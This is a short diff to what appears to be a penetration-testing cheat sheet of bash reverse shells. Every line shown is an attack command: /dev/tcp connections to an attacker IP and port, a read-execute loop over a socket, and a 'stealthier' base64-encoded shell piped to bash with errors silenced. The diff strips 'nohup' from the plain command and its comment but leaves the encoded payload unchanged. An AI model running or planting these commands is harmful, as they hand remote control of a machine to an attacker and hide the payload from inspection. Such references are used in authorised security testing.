@@ -17,10 +17,10 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 
 ```bash
 #If you need a more stable connection do:
-nohup bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
+bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 
 #Stealthier method
-#B64 encode the shell like: echo "nohup bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
+#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
 
